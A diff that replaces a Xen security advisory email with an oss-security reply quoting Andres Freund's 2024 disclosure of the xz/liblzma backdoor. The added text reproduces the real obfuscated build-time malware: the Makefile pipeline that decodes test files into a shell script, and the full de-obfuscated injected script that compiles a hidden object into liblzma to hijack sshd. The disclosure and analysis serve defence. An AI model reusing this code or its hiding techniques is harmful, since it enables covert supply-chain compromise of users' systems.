@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["60670" "Thursday" "10" "March" "2022" "12:00:25" "+0000" "Xen.org security team" "security@xen.org" nil "1085" "[oss-security] Xen Security Advisory 396 v3 (CVE-2022-23036,CVE-2022-23037,CVE-2022-23038,CVE-2022-23039,CVE-2022-23040,CVE-2022-23041,CVE-2022-23042) - Linux PV device frontends vulnerable to attacks by backends" nil nil nil "3" nil nil (number mark "U       security@xen Mar 10 1085/60670 " thread-indent "\"[oss-security] Xen Security Advisory 396 v3 (CVE-2022-23036,CVE-2022-23037,CVE-2022-23038,CVE-2022-23039,CVE-2022-23040,CVE-2022-23041,CVE-2022-23042) - Linux PV device frontends vulnerable to attacks by backends\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Xen Security Advisory 396 v3 (CVE-2022-23036,CVE-2022-23037,CVE-2022-23038,CVE-2022-23039,CVE-2022-23040,CVE-2022-23041,CVE-2022-23042) - Linux PV device frontends vulnerable to attacks by backends" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 5274 invoked by uid 550); 10 Mar 2022 12:09:29 -0000
+Received: (qmail 9690 invoked by uid 550); 29 Mar 2024 18:55:06 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,1108 +7,550 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 31885 invoked from network); 10 Mar 2022 12:00:49 -0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=xen.org;
-	s=20200302mail; h=Date:Message-Id:Subject:CC:From:To:MIME-Version:
-	Content-Transfer-Encoding:Content-Type;
-	bh=Cqrz06sMhRfR+NQvXB9OHurj3vsno2tJ12E6LUKZW6E=; b=ddLyspT5UIdJIAY+zJjPILViRY
-	zDGseKyhNbrYAFj6dhDtWHoMdcMaH2oVsjBB8TrNp7ZWOFt7j4EWQnjO3Q4HYJk3iI4nJ81Qp6p3W
-	fLggCFXTVmplz30G0p3XAsIO35ol4OgRZoTKjn2gvdcQSQsxBagMo5JIpNlVaN4AsoeE=;
-Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
-Content-Transfer-Encoding: binary
+Received: (qmail 32582 invoked from network); 29 Mar 2024 18:54:23 -0000
+Date: Fri, 29 Mar 2024 19:54:14 +0100
+From: Ivan Delalande <colona@ycc.fr>
+To: oss-security@lists.openwall.com, Andres Freund <andres@anarazel.de>,
+	Andrew Morton <akpm@linux-foundation.org>
+Message-ID: <ZgcOVnk5hCVkDUt/@ycc.fr>
+References: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
 MIME-Version: 1.0
-X-Mailer: MIME-tools 5.509 (Entity 5.509)
-To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
- xen-users@lists.xen.org, oss-security@lists.openwall.com
-From: Xen.org security team <security@xen.org>
-CC: Xen.org security team <security-team-members@xen.org>
-Message-Id: <E1nSHSz-0001kJ-R6@xenbits.xenproject.org>
-Date: Thu, 10 Mar 2022 12:00:25 +0000
-Subject: [oss-security] Xen Security Advisory 396 v3 (CVE-2022-23036,CVE-2022-23037,CVE-2022-23038,CVE-2022-23039,CVE-2022-23040,CVE-2022-23041,CVE-2022-23042)
- - Linux PV device frontends vulnerable to attacks by backends
-
---=separator
-Content-Type: text/plain; charset="utf-8"
+Content-Type: text/plain; charset=utf-8
 Content-Disposition: inline
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
+In-Reply-To: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
+User-Agent: Mutt/2.0.5 (2021-01-21)
+Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh
+ server compromise
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+On Fri, Mar 29, 2024 at 08:51:26AM -0700, Andres Freund wrote:
+> For which the exploit code was then adjusted:
+> https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
+> 
+> Given the activity over several weeks, the committer is either directly
+> involved or there was some quite severe compromise of their
+> system. Unfortunately the latter looks like the less likely explanation, given
+> they communicated on various lists about the "fixes" mentioned above.
 
- Xen Security Advisory CVE-2022-23036,CVE-2022-23037,CVE-2022-23038,CVE-2022-23039,CVE-2022-23040,CVE-2022-23041,CVE-2022-23042 / XSA-396
-                                                                 version 3
+Knowing this, I hope the recent kernel patch series involving the same
+person to some degree will get extra scrutiny:
+https://lore.kernel.org/lkml/20240320183846.19475-1-lasse.collin@tukaani.org/t/
 
-      Linux PV device frontends vulnerable to attacks by backends
-
-UPDATES IN VERSION 3
-====================
-
-Public release.
-
-ISSUE DESCRIPTION
-=================
-
-Several Linux PV device frontends are using the grant table interfaces
-for removing access rights of the backends in ways being subject to
-race conditions, resulting in potential data leaks, data corruption
-by malicious backends, and denial of service triggered by malicious
-backends:
-
-blkfront, netfront, scsifront and the gntalloc driver are testing
-whether a grant reference is still in use. If this is not the case,
-they assume that a following removal of the granted access will always
-succeed, which is not true in case the backend has mapped the granted
-page between those two operations. As a result the backend can keep
-access to the memory page of the guest no matter how the page will be
-used after the frontend I/O has finished. The xenbus driver has a
-similar problem, as it doesn't check the success of removing the
-granted access of a shared ring buffer.
-blkfront: CVE-2022-23036
-netfront: CVE-2022-23037
-scsifront: CVE-2022-23038
-gntalloc: CVE-2022-23039
-xenbus: CVE-2022-23040
-
-blkfront, netfront, scsifront, usbfront, dmabuf, xenbus, 9p, kbdfront,
-and pvcalls are using a functionality to delay freeing a grant reference
-until it is no longer in use, but the freeing of the related data page
-is not synchronized with dropping the granted access. As a result the
-backend can keep access to the memory page even after it has been freed
-and then re-used for a different purpose.
-CVE-2022-23041
+Thanks Andres, incredible find and write-up!
 
 
-netfront will fail a BUG_ON() assertion if it fails to revoke access in
-the rx path. This will result in a Denial of Service (DoS) situation of
-the guest which can be triggered by the backend.
-CVE-2022-23042
+On Fri, Mar 29, 2024 at 08:51:26AM -0700, Andres Freund wrote:
+> After observing a few odd symptoms around liblzma (part of the xz package) on
+> Debian sid installations over the last weeks (logins with ssh taking a lot of
+> CPU, valgrind errors) I figured out the answer:
+> 
+> The upstream xz repository and the xz tarballs have been backdoored.
+> 
+> At first I thought this was a compromise of debian's package, but it turns out
+> to be upstream.
+> 
+> 
+> == Compromised Release Tarball ==
+> 
+> One portion of the backdoor is *solely in the distributed tarballs*. For
+> easier reference, here's a link to debian's import of the tarball, but it is
+> also present in the tarballs for 5.6.0 and 5.6.1:
+> 
+> https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63
+> 
+> That line is *not* in the upstream source of build-to-host, nor is
+> build-to-host used by xz in git.  However, it is present in the tarballs
+> released upstream, except for the "source code" links, which I think github
+> generates directly from the repository contents:
+> 
+> https://github.com/tukaani-project/xz/releases/tag/v5.6.0
+> https://github.com/tukaani-project/xz/releases/tag/v5.6.1
+> 
+> 
+> This injects an obfuscated script to be executed at the end of configure. This
+> script is fairly obfuscated and data from "test" .xz files in the repository.
+> 
+> 
+> This script is executed and, if some preconditions match, modifies
+> $builddir/src/liblzma/Makefile to contain
+> 
+> am__test = bad-3-corrupt_lzma2.xz
+> ...
+> am__test_dir=$(top_srcdir)/tests/files/$(am__test)
+> ...
+> sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
+> 
+> 
+> which ends up as
+> ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
+> 
+> Leaving out the "| bash" that produces
+> 
+> ####Hello####
+> #��Z�.hj�
+> eval `grep ^srcdir= config.status`
+> if test -f ../../config.status;then
+> eval `grep ^srcdir= ../../config.status`
+> srcdir="../../$srcdir"
+> fi
+> export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
+> ####World####
+> 
+> After de-obfuscation this leads to the attached injected.txt.
+> 
+> 
+> == Compromised Repository ==
+> 
+> The files containing the bulk of the exploit are in an obfuscated form in
+>   tests/files/bad-3-corrupt_lzma2.xz
+>   tests/files/good-large_compressed.lzma
+> committed upstream. They were initially added in
+> https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0
+> 
+> Note that the files were not even used for any "tests" in 5.6.0.
+> 
+> 
+> Subsequently the injected code (more about that below) caused valgrind errors
+> and crashes in some configurations, due the stack layout differing from what
+> the backdoor was expecting.  These issues were attempted to be worked around
+> in 5.6.1:
+> 
+> https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad
+> https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f
+> https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92
+> 
+> For which the exploit code was then adjusted:
+> https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
+> 
+> Given the activity over several weeks, the committer is either directly
+> involved or there was some quite severe compromise of their
+> system. Unfortunately the latter looks like the less likely explanation, given
+> they communicated on various lists about the "fixes" mentioned above.
+> 
+> 
+> Florian Weimer first extracted the injected code in isolation, also attached,
+> liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
+> 
+> 
+> == Affected Systems ==
+> 
+> The attached de-obfuscated script is invoked first after configure, where it
+> decides whether to modify the build process to inject the code.
+> 
+> These conditions include targeting only x86-64 linux:
+>     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
+> 
+> Building with gcc and the gnu linker
+>     if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
+>     exit 0
+>     fi
+>     if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
+>     exit 0
+>     fi
+>     LDv=$LD" -v"
+>     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
+>     exit 0
+> 
+> Running as part of a debian or RPM package build:
+>     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+> 
+> Particularly the latter is likely aimed at making it harder to reproduce the
+> issue for investigators.
+> 
+> 
+> Due to the working of the injected code (see below), it is likely the backdoor
+> can only work on glibc based systems.
+> 
+> 
+> Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
+> distributions, and where they have, mostly in pre-release versions.
+> 
+> 
+> == Observing Impact on openssh server ==
+> 
+> With the backdoored liblzma installed, logins via ssh become a lot slower.
+> 
+> time ssh nonexistant@localhost
+> 
+> before:
+> nonexistant@localhost: Permission denied (publickey).
+> 
+> before:
+> real	0m0.299s
+> user	0m0.202s
+> sys	0m0.006s
+> 
+> after:
+> nonexistant@localhost: Permission denied (publickey).
+> 
+> real	0m0.807s
+> user	0m0.202s
+> sys	0m0.006s
+> 
+> 
+> openssh does not directly use liblzma. However debian and several other
+> distributions patch openssh to support systemd notification, and libsystemd
+> does depend on lzma.
+> 
+> 
+> Initially starting sshd outside of systemd did not show the slowdown, despite
+> the backdoor briefly getting invoked. This appears to be part of some
+> countermeasures to make analysis harder.
+> 
+> Observed requirements for the exploit:
+> a) TERM environment variable is not set
+> b) argv[0] needs to be /usr/sbin/sshd
+> c) LD_DEBUG, LD_PROFILE are not set
+> d) LANG needs to be set
+> e) Some debugging environments, like rr, appear to be detected. Plain gdb
+>    appears to be detected in some situations, but not others
+> 
+> To reproduce outside of systemd, the server can be started with a clear
+> environment, setting only the required variable:
+> 
+> env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
+> 
+> 
+> In fact, openssh does not need to be started as a server to observe the
+> slowdown:
+> 
+> slow:
+> env -i LANG=C /usr/sbin/sshd -h
+> 
+> (about 0.5s on my older system)
+> 
+> 
+> fast:
+> env -i LANG=C TERM=foo /usr/sbin/sshd -h
+> env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
+> ...
+> 
+> (about 0.01s on the same system)
+> 
+> 
+> It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
+> are obviously lots of servers linking to libsystemd.
+> 
+> 
+> == Analyzing the injected code ==
+> 
+> I am *not* a security researcher, nor a reverse engineer.  There's lots of
+> stuff I have not analyzed and most of what I observed is purely from
+> observation rather than exhaustively analyzing the backdoor code.
+> 
+> To analyze I primarily used "perf record -e intel_pt//ub" to observe where
+> execution diverges between the backdoor being active and not. Then also gdb,
+> setting breakpoints before the divergence.
+> 
+> 
+> The backdoor initially intercepts execution by replacing the ifunc resolvers
+> crc32_resolve(), crc64_resolve() with different code, which calls
+> _get_cpuid(), injected into the code (which previously would just be static
+> inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
+> symbol names.
+> 
+> These functions get resolved during startup, because sshd is built with
+> -Wl,-z,now, leading to all symbols being resolved early. If started with
+> LD_BIND_NOT=1 the backdoor does not appear to work.
+> 
+> 
+> Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
+> 'completed' variable is 0 and increments it, returning the normal cpuid result
+> (via a new _cpuid()). It gets to be more interesting during crc64_resolve().
+> 
+> In the second invocation crc64_resolve() appears to find various information,
+> like data from the dynamic linker, program arguments and environment. Then it
+> perform various environment checks, including those above. There are other
+> checks I have not fully traced.
+> 
+> If the above decides to continue, the code appears to be parsing the symbol
+> tables in memory. This is the quite slow step that made me look into the issue.
+> 
+> 
+> Notably liblzma's symbols are resolved before many of the other libraries,
+> including the symbols in the main sshd binary.  This is important because
+> symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
+> 
+> 
+> To be able to resolve symbols in libraries that have not yet loaded, the
+> backdoor installs an audit hook into the dynamic linker, which can be observed
+> with gdb using
+>   watch _rtld_global_ro._dl_naudit
+> It looks like the audit hook is only installed for the main binary.
+> 
+> That hook gets called, from _dl_audit_symbind, for numerous symbols in the
+> main binary. It appears to wait for "RSA_public_decrypt@got.plt" to be
+> resolved.  When called for that symbol, the backdoor changes the value of
+> RSA_public_decrypt@got.plt to point to its own code.  It does not do this via
+> the audit hook mechanism, but outside of it.
+> 
+> For reasons I do not yet understand, it does change sym.st_value *and* the
+> return value of from the audit hook to a different value, which leads
+> _dl_audit_symbind() to do nothing - why change anything at all then?
+> 
+> After that the audit hook is uninstalled again.
+> 
+> It is possible to change the got.plt contents at this stage because it has not
+> (and can't yet) been remapped to be read-only.
+> 
+> 
+> I suspect there might be further changes performed at this stage.
+> 
+> 
+> == Impact on sshd ==
+> 
+> The prior section explains that RSA_public_decrypt@got.plt was redirected to
+> point into the backdoor code. The trace I was analyzing indeed shows that
+> during a pubkey login the exploit code is invoked:
+> 
+>             sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@plt+0x0 (/usr/sbin/sshd)
+> 
+> The backdoor then calls back into libcrypto, presumably to perform normal authentication
+> 
+>             sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
+> 
+> 
+> I have not yet analyzed precisely what is being checked for in the injected
+> code, to allow unauthorized access. Since this is running in a
+> pre-authentication context, it seems likely to allow some form of access or
+> other form of remote code execution.
+> 
+> I'd upgrade any potentially vulnerable system ASAP.
+> 
+> 
+> == Bug reports ==
+> 
+> Given the apparent upstream involvement I have not reported an upstream
+> bug. As I initially thought it was a debian specific issue, I sent a more
+> preliminary report to security@debian.org.  Subsequently I reported the issue
+> to distros@. CISA was notified by a distribution.
+> 
+> Red Hat assigned this issue CVE-2024-3094.
+> 
+> 
+> == Detecting if installation is vulnerable ==
+> 
+> Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
+> system is vulnerable, attached here. Thanks!
+> 
+> 
+> Greetings,
+> 
+> Andres Freund
 
-IMPACT
-======
+> P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
+> C="pic_flag=\" $P\""
+> O="^pic_flag=\" -fPIC -DPIC\"$"
+> R="is_arch_extension_supported"
+> x="__get_cpuid("
+> p="good-large_compressed.lzma"
+> U="bad-3-corrupt_lzma2.xz"
+> eval $zrKcVq
+> if test -f config.status; then
+> eval $zrKcSS
+> eval `grep ^LD=\'\/ config.status`
+> eval `grep ^CC=\' config.status`
+> eval `grep ^GCC=\' config.status`
+> eval `grep ^srcdir=\' config.status`
+> eval `grep ^build=\'x86_64 config.status`
+> eval `grep ^enable_shared=\'yes\' config.status`
+> eval `grep ^enable_static=\' config.status`
+> eval `grep ^gl_path_map=\' config.status`
+> eval $zrKccj
+> if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
+> exit 0
+> fi
+> if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
+> exit 0
+> fi
+> if test "x$enable_shared" != "xyes";then
+> exit 0
+> fi
+> if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
+> exit 0
+> fi
+> if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
+> exit 0
+> fi
+> if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
+> exit 0
+> fi
+> if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
+> exit 0
+> fi
+> if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
+> exit 0
+> fi
+> if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
+> exit 0
+> fi
+> if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
+> exit 0
+> fi
+> LDv=$LD" -v"
+> if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
+> exit 0
+> fi
+> if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
+> exit 0
+> fi
+> if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
+> exit 0
+> fi
+> if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+> eval $zrKcst
+> j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
+> if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> z="^am__uninstall_files_from_dir = {"
+> if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> w="^am__install_max ="
+> if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> E=$z
+> if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> Q="^am__vpath_adj_setup ="
+> if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> M="^am__include = include"
+> if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> L="^all: all-recursive$"
+> if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
+> if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
+> if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
+> exit 0
+> fi
+> if ! grep -qs "$O" libtool > /dev/null 2>&1;then
+> exit 0
+> fi
+> eval $zrKcTy
+> b="am__test = $U"
+> sed -i "/$j/i$b" src/liblzma/Makefile || true
+> d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
+> b="am__strip_prefix = $d"
+> sed -i "/$w/i$b" src/liblzma/Makefile || true
+> b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
+> sed -i "/$E/i$b" src/liblzma/Makefile || true
+> b="\$(top_srcdir)/tests/files/\$(am__test)"
+> s="am__test_dir=$b"
+> sed -i "/$Q/i$s" src/liblzma/Makefile || true
+> h="-Wl,--sort-section=name,-X"
+> if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
+> h=$h",-z,now"
+> fi
+> j="liblzma_la_LDFLAGS += $h"
+> sed -i "/$L/i$j" src/liblzma/Makefile || true
+> sed -i "s/$O/$C/g" libtool || true
+> k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
+> sed -i "s/$u/$k/" src/liblzma/Makefile || true
+> l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
+>     export top_srcdir='\$(top_srcdir)'; \\\\\n\
+>     export CC='\$(CC)'; \\\\\n\
+>     export DEFS='\$(DEFS)'; \\\\\n\
+>     export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
+>     export INCLUDES='\$(INCLUDES)'; \\\\\n\
+>     export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
+>     export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
+>     export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
+>     export CFLAGS='\$(CFLAGS)'; \\\\\n\
+>     export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
+>     export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
+>     export libdir='\$(libdir)'; \\\\\n\
+>     export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
+>     export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
+> sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
+> sed -i "/$m/i$l" src/liblzma/Makefile || true
+> eval $zrKcHD
+> fi
+> elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
+> eval $zrKcKQ
+> if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
+> exit 0
+> fi
+> if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
+> exit 0
+> fi
+> if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
+> exit 0
+> fi
+> if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
+> exit 0
+> fi
+> if ! grep -qs "$C" ../../libtool; then
+> exit 0
+> fi
+> if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
+> exit 0
+> fi
+> if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
+> exit 0
+> fi
+> N=0
+> W=0
+> Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
+> eval $zrKcjv
+> if test -z "$Y"; then
+> N=0
+> W=88792
+> else
+> N=88792
+> W=0
+> fi
+> xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
+> if ! test -f liblzma_la-crc64-fast.o; then
+> exit 0
+> fi
+> cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
+> V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
+> eval $yosA
+> if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
+> sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
+> sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
+> $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
+> cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
+> eval $BPep
+> if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
+> sed "/include \"crc32_arm64.h\"/a \\$V" | \
+> sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
+> $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
+> eval $RgYB
+> if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
+> if test ! -f .libs/liblzma.so; then
+> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+> fi
+> rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
+> else
+> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+> fi
+> rm -f .libs/liblzma_la-crc32-fast.o || true
+> rm -f .libs/liblzma_la-crc64-fast.o || true
+> else
+> mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+> fi
+> else
+> mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+> fi
+> rm -f liblzma_la-crc64-fast.o || true
+> fi
+> eval $DHLd
 
-Due to race conditions and missing tests of return codes in the Linux
-PV device frontend drivers a malicious backend could gain access (read
-and write) to memory pages it shouldn't have, or it could directly
-trigger Denial of Service (DoS) in the guest.
-
-VULNERABLE SYSTEMS
-==================
-
-All Linux guests using PV devices are vulnerable in case potentially
-malicious PV device backends are being used.
-
-MITIGATION
-==========
-
-There is no mitigation available other than not using PV devices in case
-a backend is suspected to be potentially malicious.
-
-RESOLUTION
-==========
-
-Applying the attached patches resolves this issue.
-
-xsa396-linux-*.patch   Linux upstream
-
-$ sha256sum xsa396*
-d21d2d2c499d8e7c1cbc347d9df118b27af7d7c9ca5c104fcf1fef022ba6b92d  xsa396-linux-01.patch
-c150c7873497b4d9807fcfe2a4a4831b033597db3d4c3dfaada1e647db1395fa  xsa396-linux-02.patch
-6439ac16b6d6b29d6773d00895776a7392a321caa01f569062c4140d3d66167c  xsa396-linux-03.patch
-2cc0b472514be47690ef257ab8d296bbec1827d18f98e1f1bbbfea53aafec78c  xsa396-linux-04.patch
-cd6b6e65fe9915f98b04363bf1f22ddbd7c448215d52858ad1a2318bb1f034c8  xsa396-linux-05.patch
-353e4de564897ad07120b17aa7a6a22b90fba6e65f39c20fe561ba06405656f3  xsa396-linux-06.patch
